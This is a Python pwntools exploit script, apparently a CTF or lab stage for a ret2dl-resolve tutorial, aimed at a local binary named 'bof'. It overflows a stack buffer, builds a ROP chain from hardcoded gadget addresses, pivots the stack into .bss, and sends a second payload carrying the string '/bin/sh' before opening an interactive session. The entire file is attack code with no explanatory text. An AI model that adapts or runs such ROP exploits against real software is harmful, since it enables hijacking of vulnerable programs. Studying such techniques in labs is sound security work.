# coding=utf-8
# 原理 http://pwn4.fun/2016/11/09/Return-to-dl-resolve/
from pwn import *

sh = process("./bof")
pwn = ELF("./bof")
read = pwn.plt["read"]
write = pwn.plt["write"]
base_stage = pwn.bss() + 0x800
pop_ebp_ret = 0x080492db
ppp_ret = 0x080492d9
leave_ret = 0x08049105
payload1 = flat(['a'*(0x6c+4), read, ppp_ret, 0, base_stage, 0x100, pop_ebp_ret, base_stage, leave_ret])
sh.sendline(payload1)

cmd = "/bin/sh"
payload2 = "aaaa"
payload2 += flat([write, "aaaa", 1, base_stage+0x80, len(cmd)])
payload2 = payload2.ljust(0x80, 'a')
payload2 += cmd + '\x00'
payload2 = payload2.ljust(0x100, 'a')
sh.sendline(payload2)
sh.interactive()
